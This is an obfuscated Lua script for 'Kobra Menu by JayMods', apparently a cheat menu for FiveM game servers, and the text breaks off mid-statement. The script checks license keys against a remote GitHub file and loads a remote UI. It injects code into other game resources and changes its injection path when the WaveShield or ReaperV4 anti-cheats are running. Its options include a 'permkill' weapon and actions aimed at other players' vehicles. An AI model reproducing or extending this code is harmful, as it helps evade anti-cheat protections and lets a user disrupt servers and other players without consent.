MachoLockLogger(2 -1 );local v0="jkiushdiufhsdbofihUYHFUYJASHIUYGAS872765873u4hj5nkjbytFCUSAKIHJJYDSFHTDHSHOIUHdiuaghdfjyhsbdioufjneqwouerhy287y34gujkdsnikufguyhcflbijksdfhugygdisufhgsyhtgdfvsd";local function v1(v119,v120) local v121=1354 -(243 + 1111) ;local v122;while true do if (v121==1) then if DEBUG then local v754={};for v836=1 + 0 , #v122 do v754[v836]=string.byte(v122,v836);end print("[KOBRA Safety] Decoded secret: "   .. table.concat(v754,",") );end return v122;end if (v121==0) then v122="";for v701=159 -(91 + 67) , #v119 do local v702=string.byte(v119,v701);v122=v122   .. string.char((v702-v120)%(761 -505) ) ;end v121=1 + 0 ;end end end local v2="https://raw.githubusercontent.com/WM5M/564756558758547545475566858754hnfvngfjhgvgjfjghfffjfgffjgj/refs/heads/main/wzmkeys.json";local v3=MachoWebRequest(v2);local v4=MachoAuthenticationKey();local v5=true;local function v6() local v123=GetCloudTimeAsInt();return ((v123>0) and v123) or 0 ;end local function v7(v124) local v125=0;local v126;local v127;local v128;local v129;local v130;local v131;local v132;while true do if (v125==(523 -(423 + 100))) then if (type(v124)~="string") then return nil;end v126,v127,v128,v129,v130,v131=string.match(v124,"(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)Z");v125=1 + 0 ;end if (v125==1) then if  not v126 then return nil;end v132=((tonumber(v126) -1970) * (1010 -645)) + math.floor((tonumber(v126) -(1027 + 942))/(775 -(326 + 445)) ) + ((tonumber(v127) -(4 -3)) * 30) + tonumber(v128) ;v125=4 -2 ;end if (v125==2) then return (v132 * 86400) + (tonumber(v129) * (8403 -4803)) + (tonumber(v130) * (771 -(530 + 181))) + tonumber(v131) ;end end end local function v8() if  not v3 then return false,"No key list available";end local v133,v134=pcall(json.decode,v3);if ( not v133 or  not v134 or (type(v134)~="table")) then return false,"Key list invalid";end local v135=v6();for v314,v315 in ipairs(v134) do if ((type(v315)=="table") and (v315.key==v4)) then if (v315.expires and (type(v315.expires)=="string")) then local v755=881 -(614 + 267) ;local v756;while true do if (v755==1) then if (v756>v135) then return true,"Key valid (not expired)",v756;else return false,"Key expired",v756;end break;end if (v755==(32 -(19 + 13))) then v756=v7(v315.expires);if  not v756 then return false,"Bad expiry format";end v755=1 -0 ;end end elseif v5 then return false,"Key missing expiry (strict mode)";else return true,"Key valid (no expiry field)";end end end return false,"Key not found";end local v9,v10,v11=v8();if  not v9 then local v316=0;while true do if (v316==0) then MachoMenuNotification("KOBRA","Your key ain't valid lmfao: "   .. v4   .. " ("   .. v10   .. ")" ,10);return;end end end Citizen.CreateThread(function() if (v11 and (v11>(0 -0))) then local v521=v6();local v522=v11-v521 ;if (v522>(0 -0)) then local v703=0 + 0 ;local v704;local v705;local v706;while true do if (v703==(1 -0)) then v706=string.format("Your key is valid. Expires in %d days and %d hours.",v704,v705);MachoMenuNotification("KOBRA",v706,10 -5 );break;end if (v703==(1812 -(1293 + 519))) then v704=math.floor(v522/(176283 -89883) );v705=math.floor((v522%(225586 -139186))/3600 );v703=1 -0 ;end end else MachoMenuNotification("KOBRA","Key expired.",43 -33 );end else MachoMenuNotification("KOBRA","Key valid (no expiry field).",11 -6 );end end);local v12={};local v13=false;local v14=nil;local v15=1 + 0 ;local v16={};local v17=v16;local v18=nil;local v19=1 + 0 ;local v20={};local v21={};local v22=nil;local v23="H";local v24=false;local v25={};local v26=false;local v27={};local v28={[GetHashKey("weapon_unarmed")]="Fists",[GetHashKey("weapon_knife")]="Knife",[GetHashKey("weapon_nightstick")]="Nightstick",[GetHashKey("weapon_hammer")]="Hammer",[GetHashKey("weapon_bat")]="Baseball Bat",[GetHashKey("weapon_golfclub")]="Golf Club",[GetHashKey("weapon_crowbar")]="Crowbar",[GetHashKey("weapon_pistol")]="Pistol",[GetHashKey("weapon_pistol_mk2")]="Pistol Mk II",[GetHashKey("weapon_snspistol_mk2")]="SNS Pistol Mk II",[GetHashKey("weapon_ceramicpistol")]="Ceramic Pistol",[GetHashKey("weapon_revolver_mk2")]="Heavy Revolver Mk II",[GetHashKey("weapon_doubleaction")]="Double-Action Revolver",[GetHashKey("weapon_gadgetpistol")]="Gadget Pistol",[GetHashKey("weapon_pistolxm3")]="WM 29 Pistol",[GetHashKey("weapon_combatpistol")]="Combat Pistol",[GetHashKey("weapon_appistol")]="AP Pistol",[GetHashKey("weapon_pistol50")]="Pistol .50",[GetHashKey("weapon_microsmg")]="Micro SMG",[GetHashKey("weapon_smg")]="SMG",[GetHashKey("weapon_assaultsmg")]="Assault SMG",[GetHashKey("weapon_assaultrifle")]="Assault Rifle",[GetHashKey("weapon_assaultrifle_mk2")]="Assault Rifle Mk II",[GetHashKey("weapon_specialcarbine_mk2")]="Special Carbine Mk II",[GetHashKey("weapon_bullpuprifle_mk2")]="Bullpup Rifle Mk II",[GetHashKey("weapon_militaryrifle")]="Military Rifle",[GetHashKey("weapon_tacticalrifle")]="Service Carbine",[GetHashKey("weapon_battlerifle")]="Battle Rifle",[GetHashKey("weapon_carbinerifle")]="Carbine Rifle",[GetHashKey("weapon_advancedrifle")]="Advanced Rifle",[GetHashKey("weapon_mg")]="MG",[GetHashKey("weapon_combatmg")]="Combat MG",[GetHashKey("weapon_pumpshotgun")]="Pump Shotgun",[GetHashKey("weapon_sawnoffshotgun")]="Sawed-Off Shotgun",[GetHashKey("weapon_assaultshotgun")]="Assault Shotgun",[GetHashKey("weapon_bullpupshotgun")]="Bullpup Shotgun",[GetHashKey("weapon_hackingdevice")]="Hacking Device",[GetHashKey("weapon_stungun")]="Stun Gun",[GetHashKey("weapon_stungun_mp")]="Stun Gun MP",[GetHashKey("weapon_sniperrifle")]="Sniper Rifle",[GetHashKey("weapon_heavysniper")]="Heavy Sniper",[GetHashKey("weapon_grenadelauncher")]="Grenade Launcher",[GetHashKey("weapon_rpg")]="RPG",[GetHashKey("weapon_minigun")]="Minigun",[GetHashKey("weapon_grenade")]="Grenade",[GetHashKey("weapon_stickybomb")]="Sticky Bomb",[GetHashKey("weapon_smokegrenade")]="Smoke Grenade",[GetHashKey("weapon_bzgas")]="BZ Gas",[GetHashKey("weapon_molotov")]="Molotov Cocktail",[GetHashKey("weapon_fireextinguisher")]="Fire Extinguisher",[GetHashKey("weapon_petrolcan")]="Jerry Can",[GetHashKey("weapon_ball")]="Baseball",[GetHashKey("weapon_snspistol")]="SNS Pistol",[GetHashKey("weapon_bottle")]="Broken Bottle",[GetHashKey("weapon_gusenberg")]="Gusenberg Sweeper",[GetHashKey("weapon_specialcarbine")]="Special Carbine",[GetHashKey("weapon_heavypistol")]="Heavy Pistol",[GetHashKey("weapon_bullpuprifle")]="Bullpup Rifle",[GetHashKey("weapon_dagger")]="Dagger",[GetHashKey("weapon_vintagepistol")]="Vintage Pistol",[GetHashKey("weapon_firework")]="Firework Launcher",[GetHashKey("weapon_musket")]="Musket",[GetHashKey("weapon_heavyshotgun")]="Heavy Shotgun",[GetHashKey("weapon_marksmanrifle")]="Marksman Rifle",[GetHashKey("weapon_hominglauncher")]="Homing Launcher",[GetHashKey("weapon_proxmine")]="Proximity Mines",[GetHashKey("weapon_snowball")]="Snowball",[GetHashKey("weapon_flaregun")]="Flare Gun",[GetHashKey("weapon_garbagebag")]="Garbage Bag",[GetHashKey("weapon_handcuffs")]="Handcuffs",[GetHashKey("weapon_combatpdw")]="Combat PDW",[GetHashKey("weapon_marksmanpistol")]="Marksman Pistol",[GetHashKey("weapon_knuckle")]="Knuckle Dusters",[GetHashKey("weapon_hatchet")]="Hatchet",[GetHashKey("weapon_railgun")]="Railgun",[GetHashKey("weapon_machinepistol")]="Machine Pistol",[GetHashKey("weapon_switchblade")]="Switchblade",[GetHashKey("weapon_revolver")]="Heavy Revolver",[GetHashKey("weapon_heavyrifle")]="Heavy Rifle",[GetHashKey("weapon_dbshotgun")]="Double Barrel Shotgun",[GetHashKey("weapon_compactrifle")]="Compact Rifle",[GetHashKey("weapon_battleaxe")]="Battle Axe",[GetHashKey("weapon_compactlauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_minismg")]="Mini SMG",[GetHashKey("weapon_pipebomb")]="Pipe Bomb",[GetHashKey("weapon_poolcue")]="Pool Cue",[GetHashKey("weapon_wrench")]="Wrench",[GetHashKey("weapon_autoshotgun")]="Sweeper Shotgun",[GetHashKey("weapon_bread")]="Piece of Bread",[GetHashKey("weapon_stone_hatchet")]="Stone Hatchet",[GetHashKey("weapon_rayminigun")]="Unholy Hellbringer",[GetHashKey("weapon_raycarbine")]="Widowmaker",[GetHashKey("weapon_compactgrenadelauncher")]="Compact Grenade Launcher",[GetHashKey("weapon_smugglerpistol")]="Up-n-Atomizer",[GetHashKey("weapon_raypistol")]="Up-n-Atomizer",[GetHashKey("weapon_perico_pistol")]="Ceramic Pistol",[GetHashKey("weapon_carbinerifle_mk2")]="Carbine Rifle Mk II",[GetHashKey("weapon_combatmg_mk2")]="Combat MG Mk II",[GetHashKey("weapon_heavysniper_mk2")]="Heavy Sniper Mk II",[GetHashKey("weapon_marksmanrifle_mk2")]="Marksman Rifle Mk II",[GetHashKey("weapon_pumpshotgun_mk2")]="Pump Shotgun Mk II",[GetHashKey("weapon_smg_mk2")]="SMG Mk II",[GetHashKey("weapon_raycarbine_mk2")]="Widowmaker Mk II",[GetHashKey("weapon_machete")]="Machete",[GetHashKey("weapon_flashlight")]="Flashlight",[GetHashKey("weapon_hazardousknife")]="Hazardous Knife",[GetHashKey("weapon_navyrevolver")]="Navy Revolver",[GetHashKey("weapon_golfball")]="Golf Ball"};local v29=false;local v30=false;local v31=false;local v32=false;local v33=nil;local v34=2 -1 ;local v35=1 + 0 ;local v36={"WEAPON_APPISTOL","WEAPON_PISTOL","WEAPON_SMG","WEAPON_ASSAULTRIFLE","WEAPON_RPG","WEAPON_PERMKILL","WEAPON_AIRSTRIKE_ROCKET"};local v37={"Adder","Zentorno","Comet","Banshee","Trash","Dump"};local v38={"Default","Teleport","Shoot Weapon","Kick from Vehicle","Hijack Vehicle","Delete Vehicle"};local v39=1881 -(446 + 1434) ;local v40=false;local v41=false;local v42=false;local v43=false;local v44={[27]="Escape",[1395 -(1040 + 243) ]="F1",[337 -224 ]="F2",[1961 -(559 + 1288) ]="F3",[115]="F4",[2047 -(609 + 1322) ]="F5",[571 -(13 + 441) ]="F6",[440 -322 ]="F7",[119]="F8",[120]="F9",[316 -195 ]="F10",[122]="F11",[123]="F12",[956 -764 ]="`",[2 + 47 ]="1",[50]="2",[185 -134 ]="3",[19 + 33 ]="4",[53]="5",[24 + 30 ]="6",[55]="7",[166 -110 ]="8",[32 + 25 ]="9",[88 -40 ]="0",[125 + 64 ]="-",[105 + 82 ]="=",[6 + 2 ]="Backspace",[8 + 1 ]="Tab",[80 + 1 ]="Q",[520 -(153 + 280) ]="W",[69]="E",[236 -154 ]="R",[76 + 8 ]="T",[36 + 53 ]="Y",[45 + 40 ]="U",[73]="I",[72 + 7 ]="O",[80]="P",[159 + 60 ]="[",[336 -115 ]="]",[136 + 84 ]="\\",[20]="CapsLock",[732 -(89 + 578) ]="A",[83]="S",[49 + 19 ]="D",[70]="F",[71]="G",[149 -77 ]="H",[1123 -(572 + 477) ]="J",[75]="K",[76]="L",[186]=";",[30 + 192 ]="'",[8 + 5 ]="Enter",[2 + 14 ]="Shift",[176 -(84 + 2) ]="Z",[144 -56 ]="X",[49 + 18 ]="C",[86]="V",[908 -(497 + 345) ]="B",[2 + 76 ]="N",[77]="M",[188]=",",[33 + 157 ]=".",[1524 -(605 + 728) ]="/",[13 + 4 ]="Control",[101 -55 ]="Delete",[2 + 31 ]="PageUp",[125 -91 ]="PageDown",[35]="End",[36]="Home",[38]="ArrowUp",[37 + 3 ]="ArrowDown",[37]="ArrowLeft",[107 -68 ]="ArrowRight"};local v45={[21 + 6 ]=811 -(457 + 32) ,[48 + 64 ]=1690 -(832 + 570) ,[113]=273 + 16 ,[30 + 84 ]=601 -431 ,[56 + 59 ]=167,[912 -(588 + 208) ]=447 -281 ,[1917 -(884 + 916) ]=167,[118]=351 -183 ,[119]=98 + 71 ,[773 -(232 + 421) ]=1945 -(1569 + 320) ,[121]=14 + 43 ,[122]=66 + 278 ,[123]=1162 -817 ,[797 -(316 + 289) ]=635 -392 ,[49]=8 + 149 ,[1503 -(666 + 787) ]=583 -(360 + 65) ,[51]=150 + 10 ,[306 -(79 + 175) ]=257 -93 ,[42 + 11 ]=505 -340 ,[103 -49 ]=1058 -(503 + 396) ,[236 -(92 + 89) ]=312 -151 ,[56]=84 + 78 ,[34 + 23 ]=638 -475 ,[48]=12 + 70 ,[430 -241 ]=74 + 10 ,[90 + 97 ]=83,[24 -16 ]=23 + 154 ,[13 -4 ]=1281 -(485 + 759) ,[81]=101 -57 ,[1276 -(442 + 747) ]=1167 -(832 + 303) ,[1015 -(88 + 858) ]=15 + 31 ,[68 + 14 ]=45,[84]=11 + 234 ,[878 -(766 + 23) ]=246,[419 -334 ]=413 -110 ,[73]=194 -120 ,[79]=675 -476 ,[80]=7,[1292 -(1036 + 37) ]=28 + 11 ,[430 -209 ]=40,[174 + 46 ]=36,[1500 -(641 + 839) ]=137,[978 -(910 + 3) ]=86 -52 ,[83]=1717 -(1466 + 218) ,[32 + 36 ]=1178 -(556 + 592) ,[25 + 45 ]=857 -(329 + 479) ,[925 -(174 + 680) ]=47,[72]=74,[253 -179 ]=311,[75]=644 -333 ,[55 + 21 ]=746 -(396 + 343) ,[17 + 169 ]=1558 -(29 + 1448) ,[222]=1471 -(135 + 1254) ,[13]=67 -49 ,[74 -58 ]=14 + 7 ,[1617 -(389 + 1138) ]=594 -(102 + 472) ,[84 + 4 ]=41 + 32 ,[67]=25 + 1 ,[1631 -(320 + 1225) ]=0 -0 ,[41 + 25 ]=29,[1542 -(157 + 1307) ]=2108 -(821 + 1038) ,[191 -114 ]=27 + 217 ,[333 -145 ]=31 + 51 ,[470 -280 ]=1107 -(834 + 192) ,[191]=6 + 77 ,[17]=10 + 26 ,[1 + 45 ]=275 -97 ,[33]=10,[34]=11,[339 -(300 + 4) ]=57 + 156 ,[94 -58 ]=213,[400 -(112 + 250) ]=11 + 16 ,[40]=433 -260 ,[22 + 15 ]=90 + 84 ,[39]=131 + 44 };local v46={weapon_unarmed={label="Unarmed",hash=GetHashKey("weapon_unarmed")},weapon_knife={label="Knife",hash=GetHashKey("weapon_knife")},weapon_dagger={label="Dagger",hash=GetHashKey("weapon_dagger")},weapon_bat={label="Baseball Bat",hash=GetHashKey("weapon_bat")},weapon_bottle={label="Broken Bottle",hash=GetHashKey("weapon_bottle")},weapon_crowbar={label="Crowbar",hash=GetHashKey("weapon_crowbar")},weapon_golfclub={label="Golf Club",hash=GetHashKey("weapon_golfclub")},weapon_hammer={label="Hammer",hash=GetHashKey("weapon_hammer")},weapon_hatchet={label="Hatchet",hash=GetHashKey("weapon_hatchet")},weapon_machete={label="Machete",hash=GetHashKey("weapon_machete")},weapon_switchblade={label="Switchblade",hash=GetHashKey("weapon_switchblade")},weapon_nightstick={label="Nightstick",hash=GetHashKey("weapon_nightstick")},weapon_wrench={label="Wrench",hash=GetHashKey("weapon_wrench")},weapon_pistol={label="Pistol",hash=GetHashKey("weapon_pistol")},weapon_pistol_mk2={label="Pistol Mk II",hash=GetHashKey("weapon_pistol_mk2")},weapon_combatpistol={label="Combat Pistol",hash=GetHashKey("weapon_combatpistol")},weapon_appistol={label="AP Pistol",hash=GetHashKey("weapon_appistol")},weapon_stungun={label="Taser",hash=GetHashKey("weapon_stungun")},weapon_pistol50={label="Pistol .50",hash=GetHashKey("weapon_pistol50")},weapon_snspistol={label="SNS Pistol",hash=GetHashKey("weapon_snspistol")},weapon_heavypistol={label="Heavy Pistol",hash=GetHashKey("weapon_heavypistol")},weapon_vintagepistol={label="Vintage Pistol",hash=GetHashKey("weapon_vintagepistol")},weapon_flaregun={label="Flare Gun",hash=GetHashKey("weapon_flaregun")},weapon_microsmg={label="Micro SMG",hash=GetHashKey("weapon_microsmg")},weapon_smg={label="SMG",hash=GetHashKey("weapon_smg")},weapon_smg_mk2={label="SMG Mk II",hash=GetHashKey("weapon_smg_mk2")},weapon_assaultsmg={label="Assault SMG",hash=GetHashKey("weapon_assaultsmg")},weapon_machinepistol={label="Machine Pistol",hash=GetHashKey("weapon_machinepistol")},weapon_minismg={label="Mini SMG",hash=GetHashKey("weapon_minismg")},weapon_combatpdw={label="Combat PDW",hash=GetHashKey("weapon_combatpdw")},weapon_assaultrifle={label="Assault Rifle",hash=GetHashKey("weapon_assaultrifle")},weapon_assaultrifle_mk2={label="Assault Rifle Mk II",hash=GetHashKey("weapon_assaultrifle_mk2")},weapon_carbinerifle={label="Carbine Rifle",hash=GetHashKey("weapon_carbinerifle")},weapon_carbinerifle_mk2={label="Carbine Rifle Mk II",hash=GetHashKey("weapon_carbinerifle_mk2")},weapon_advancedrifle={label="Advanced Rifle",hash=GetHashKey("weapon_advancedrifle")},weapon_specialcarbine={label="Special Carbine",hash=GetHashKey("weapon_specialcarbine")},weapon_bullpuprifle={label="Bullpup Rifle",hash=GetHashKey("weapon_bullpuprifle")},weapon_bullpuprifle_mk2={label="Bullpup Rifle Mk II",hash=GetHashKey("weapon_bullpuprifle_mk2")},weapon_compactrifle={label="Compact Rifle",hash=GetHashKey("weapon_compactrifle")},weapon_marksmanrifle={label="Marksman Rifle",hash=GetHashKey("weapon_marksmanrifle")},weapon_pumpshotgun={label="Pump Shotgun",hash=GetHashKey("weapon_pumpshotgun")},weapon_pumpshotgun_mk2={label="Pump Shotgun Mk II",hash=GetHashKey("weapon_pumpshotgun_mk2")},weapon_sawnoffshotgun={label="Sawed-Off Shotgun",hash=GetHashKey("weapon_sawnoffshotgun")},weapon_assaultshotgun={label="Assault Shotgun",hash=GetHashKey("weapon_assaultshotgun")},weapon_bullpupshotgun={label="Bullpup Shotgun",hash=GetHashKey("weapon_bullpupshotgun")},weapon_heavyshotgun={label="Heavy Shotgun",hash=GetHashKey("weapon_heavyshotgun")},weapon_autoshotgun={label="Auto Shotgun",hash=GetHashKey("weapon_autoshotgun")},weapon_sniperrifle={label="Sniper Rifle",hash=GetHashKey("weapon_sniperrifle")},weapon_heavysniper={label="Heavy Sniper",hash=GetHashKey("weapon_heavysniper")},weapon_heavysniper_mk2={label="Heavy Sniper Mk II",hash=GetHashKey("weapon_heavysniper_mk2")},weapon_marksmanrifle_mk2={label="Marksman Rifle Mk II",hash=GetHashKey("weapon_marksmanrifle_mk2")},weapon_grenade={label="Grenade",hash=GetHashKey("weapon_grenade")},weapon_stickybomb={label="Sticky Bomb",hash=GetHashKey("weapon_stickybomb")},weapon_molotov={label="Molotov Cocktail",hash=GetHashKey("weapon_molotov")},weapon_pipebomb={label="Pipe Bomb",hash=GetHashKey("weapon_pipebomb")},weapon_proxmine={label="Proximity Mine",hash=GetHashKey("weapon_proxmine")},weapon_rpg={label="RPG",hash=GetHashKey("weapon_rpg")},weapon_grenadelauncher={label="Grenade Launcher",hash=GetHashKey("weapon_grenadelauncher")},weapon_hominglauncher={label="Homing Launcher",hash=GetHashKey("weapon_hominglauncher")},weapon_minigun={label="Minigun",hash=GetHashKey("weapon_minigun")},weapon_railgun={label="Railgun",hash=GetHashKey("weapon_railgun")},weapon_ball={label="Baseball",hash=GetHashKey("weapon_ball")},weapon_smokegrenade={label="Smoke Grenade",hash=GetHashKey("weapon_smokegrenade")},weapon_flare={label="Flare",hash=GetHashKey("weapon_flare")},weapon_petrolcan={label="Jerry Can",hash=GetHashKey("weapon_petrolcan")},weapon_bzgas={label="BZ Gas",hash=GetHashKey("weapon_bzgas")}};local v47=((GetResourceState("WaveShield")=="started") and "Raw") or "Default" ;local v48=((v47=="Raw") and MachoInjectResourceRaw) or MachoInjectResource ;local function v49(v136) MachoInjectResource("any",v136);end v12.Debug=function(v137,v138,v139) local v140={red="^1",yellow="^3",green="^2",info="^5"};local v141=v140[v138] or "^5" ;print(("^7[^5Kobra^7]: [%sDEBUG^7] >> %s"):format(v141,v139));end;v12.SendMessage=function(v142,v143) if (v14 and v143) then MachoSendDuiMessage(v14,json.encode(v143));end end;v12.Notify=function(v144,v145,v146,v147,v148) v144:SendMessage({action="showNotification",type=v145,title=v146,desc=v147,duration=v148});end;v12.GetMenuPath=function(v149) local v150={"Kobra Menu by JayMods"};for v317=1, #v21 do table.insert(v150,v21[v317]);end return v150;end;v12.UpdateElements=function(v151,v152) if ( not v152 or (type(v152)~="table")) then return;end local v153={action="updateElements",elements=v152,index=v15-(1 + 0) ,path=v151:GetMenuPath()};if (v18 and (type(v18)=="table") and ( #v18>0)) then v153.categories=v18;v153.categoryIndex=(v19 or 1) -(1415 -(1001 + 413)) ;end v151:SendMessage(v153);end;v12.Initialize=function(v154) local v155=0 -0 ;local v156;while true do if (v155==(882 -(244 + 638))) then v156="https://rawcdn.githack.com/WM5M/sdkhbvfsdhjkvbdbcfjgasvdhjve64654656843242hjg4g43kg4aguk534/refs/heads/main/3h1.html";v14=MachoCreateDui(v156);v155=694 -(627 + 66) ;end if (v155==(2 -1)) then if v14 then local v757=602 -(512 + 90) ;while true do if ((1907 -(1665 + 241))==v757) then v154:Debug("green","Kobra UI loaded successfully!");break;end if (0==v757) then v154:Debug("yellow","Creating & Initializing Kobra DUI...");MachoShowDui(v14);v757=718 -(373 + 344) ;end end else v154:Debug("red","Failed to load Kobra UI!");end break;end end end;v12.HideUI=function(v157,v158) if v158 then v22={currentMenu=v17,hoveredIndex=v15,menuStack=v20,menuLabelStack=v21,currentCategories=v18,currentCategoryIndex=v19};else v22=nil;end v13=false;v157:SendMessage({action="keydown",index=0 + 0 });v157:SendMessage({action="showUI",visible=false,index=0});end;v12.SendMessage=function(v159,v160) if ( not v14 or  not v160 or (type(v160)~="table")) then return;end MachoSendDuiMessage(v14,json.encode(v160));end;v12.ShowUI=function(v161) v13=true;local v162={action="showUI",visible=true,elements=v17,index=v15-(1 + 0) ,path=v161:GetMenuPath(),username=Username or "KobraBypass" ,header="JayMods",theme="kobra-red-black"};if (v18 and ( #v18>(0 -0))) then local v525=0 -0 ;while true do if (v525==(1099 -(35 + 1064))) then v162.categories=v18;v162.categoryIndex=v19-(1 + 0) ;break;end end end v161:SendMessage(v162);end;v12.UpdateElements=function(v163,v164) local v165=0 -0 ;local v166;while true do if (v165==1) then if (v18 and ( #v18>(0 + 0))) then local v760=1236 -(298 + 938) ;while true do if (v760==0) then v166.categories=v18;v166.categoryIndex=(v19 or 1) -(1260 -(233 + 1026)) ;break;end end end v163:SendMessage(v166);break;end if (0==v165) then if ( not v164 or (type(v164)~="table")) then return;end v166={action="updateElements",elements=v164,index=v15-(1667 -(636 + 1030)) ,path=v163:GetMenuPath(),header="JayMods"};v165=1 + 0 ;end end end;v12.IsShiftHeld=function(v167) return v26;end;MachoOnKeyDown(function(v168) if ((v168==16) or (v168==(157 + 3)) or (v168==(48 + 113))) then v26=true;end end);MachoOnKeyUp(function(v169) if ((v169==16) or (v169==(11 + 149)) or (v169==(382 -(55 + 166)))) then v26=false;end end);local v59=nil;local function v60(v170,v171,v172,v173) if v59 then return;end v59={title=v170,buffer=v171 or "" ,maxLength=7 + 25 ,onConfirm=v172,type=v173 or "typeable" ,closeable=((v173=="keybind") and false) or true ,active=true};MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v170,value=v59.buffer}));if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[ SetNuiFocus(true, true) sendMenuMessage('setDebugMode') ]]);end Wait(26 + 224 );v12:HideUI(true);v24=false;end MachoOnKeyDown(function(v174) if ( not v59 or  not v59.active) then return;end if (v174==13) then local v526=0 -0 ;while true do if (v526==(299 -(36 + 261))) then v59=nil;v24=true;v526=3;end if (v526==0) then v59.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v526=1;end if (v526==1) then if v59.onConfirm then v59.onConfirm(v59.buffer);end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
            SetNuiFocus(false, false)
            sendMenuMessage('setDebugMode')
        ]]);end v526=3 -1 ;end if (v526==3) then return;end end elseif (v174==(1376 -(34 + 1334))) then if (v59.type=="typeable") then v59.buffer=v59.buffer:sub(1 + 0 , -2);else v59.buffer="";end elseif (v174==(21 + 6)) then if  not v59.closeable then return;end if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(false, false)
                sendMenuMessage('setDebugMode')
            ]]);end v59.active=false;MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=false}));v59=nil;v24=true;return;elseif (v59.type=="keybind") then local v915=0;local v916;while true do if (v915==(1283 -(1035 + 248))) then v916=v44[v174];if v916 then if (v59.buffer~=v916) then v59.buffer=v916;end end break;end end elseif (v59.type=="typeable") then local v1016=21 -(20 + 1) ;local v1017;local v1018;while true do if (v1016==0) then v1017={[48]="0",[49]="1",[27 + 23 ]="2",[370 -(134 + 185) ]="3",[52]="4",[1186 -(549 + 584) ]="5",[54]="6",[55]="7",[741 -(314 + 371) ]="8",[195 -138 ]="9",[1033 -(478 + 490) ]="A",[35 + 31 ]="B",[1239 -(786 + 386) ]="C",[220 -152 ]="D",[69]="E",[1449 -(1055 + 324) ]="F",[1411 -(1093 + 247) ]="G",[72]="H",[65 + 8 ]="I",[8 + 66 ]="J",[297 -222 ]="K",[257 -181 ]="L",[218 -141 ]="M",[78]="N",[79]="O",[201 -121 ]="P",[81]="Q",[82]="R",[30 + 53 ]="S",[323 -239 ]="T",[292 -207 ]="U",[86]="V",[87]="W",[88]="X",[68 + 21 ]="Y",[230 -140 ]="Z",[877 -(364 + 324) ]="-",[512 -325 ]="=",[188]=",",[455 -265 ]=".",[186]=";",[222]="'",[64 + 127 ]="/",[192]="`",[133 -101 ]=" "};v1018=v1017[v174];v1016=1;end if (v1016==1) then if (v1018 and ( #v59.buffer<v59.maxLength)) then if v12:IsShiftHeld() then if v1018:match("%a") then v1018=v1018:upper();elseif (v1018=="-") then v1018="_";end elseif v1018:match("%a") then v1018=v1018:lower();end v59.buffer=v59.buffer   .. v1018 ;end break;end end end if v59 then MachoSendDuiMessage(v14,json.encode({action="updateKeyboard",visible=true,title=v59.title,value=v59.buffer}));end end);CreateThread(function() while true do local v318=0 -0 ;while true do if (v318==0) then Wait(0 -0 );if (v59~=nil) then local v841=1268 -(1249 + 19) ;while true do if (v841==(0 + 0)) then if (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);elseif (GetResourceState("ReaperV4")=="started") then else MachoInjectResourceRaw("monitor",[[
                SetNuiFocus(true, true)
                sendMenuMessage('setDebugMode')
            ]]);end SetPauseMenuActive(false);v841=3 -2 ;end if ((1087 -(686 + 400))==v841) then for v1019=0,281 + 76  do if ((v1019<(277 -(73 + 156))) or (v1019>(1 + 89))) then DisableControlAction(811 -(721 + 90) ,v1019,true);end end break;end end else Wait(6 + 494 );end break;end end end end);v12.ScrollOne=function(v175,v176) local v177=0;local v178;while true do if (v177==(3 -2)) then repeat if (v176=="Up") then local v842=470 -(224 + 246) ;while true do if (v842==(0 -0)) then v15=v15-(1 -0) ;if (v15<(1 + 0)) then v15= #v17;end break;end end elseif (v176=="Down") then local v917=0 + 0 ;while true do if (v917==(0 + 0)) then v15=v15 + (1 -0) ;if (v15> #v17) then v15=1;end break;end end end v178=v178 + 1 ;if (v178>(665 -465)) then break;end until v17[v15] and (v17[v15].type~="divider")  if v14 then v175:SendMessage({action="keydown",index=v15-1 });end break;end if (v177==(513 -(203 + 310))) then if ( not v176 or ( #v17==(1993 -(1238 + 755)))) then return;end v178=0 + 0 ;v177=1;end end end;v12.ScrollTwo=function(v179,v180) local v181=0;local v182;while true do if (1==v181) then if (((v182.type=="scrollable") or (v182.type=="scrollable-checkbox")) and v182.values and ( #v182.values>(1534 -(709 + 825)))) then v182.value=v182.value or 1 ;if (v180=="Left") then v182.value=v182.value-(1 -0) ;if (v182.value<(1 -0)) then v182.value= #v182.values;end elseif (v180=="Right") then v182.value=v182.value + (865 -(196 + 668)) ;if (v182.value> #v182.values) then v182.value=3 -2 ;end end v179:UpdateElements(v17);if ((v182.scrollType=="onScroll") and v182.onSelect) then if (v182.type=="scrollable-checkbox") then v182.onSelect(v182.values[v182.value],v182.checked or false );else v182.onSelect(v182.values[v182.value]);end end elseif ((v182.type=="slider") or (v182.type=="slider-checkbox")) then local v866=0 -0 ;local v867;while true do if (v866==(833 -(171 + 662))) then v182.value=v182.value or v182.min or (93 -(4 + 89)) ;v867=v182.step or 1 ;v866=1;end if (v866==2) then v179:UpdateElements(v17);if ((v182.scrollType=="onScroll") and v182.onSelect) then if (v182.type=="slider-checkbox") then v182.onSelect(v182.value,v182.checked or false );else v182.onSelect(v182.value);end end break;end if (v866==1) then if (v180=="Left") then v182.value=math.max(v182.min or 0 ,v182.value-v867 );elseif (v180=="Right") then v182.value=math.min(v182.max or 100 ,v182.value + v867 );end for v1091,v1092 in pairs(v25) do if ((v1092.type=="slider-checkbox") and (type(v1092.value)~="nil") and (v1092.label==v182.label)) then if (v180=="Left") then v1092.value=math.max(v182.min or 0 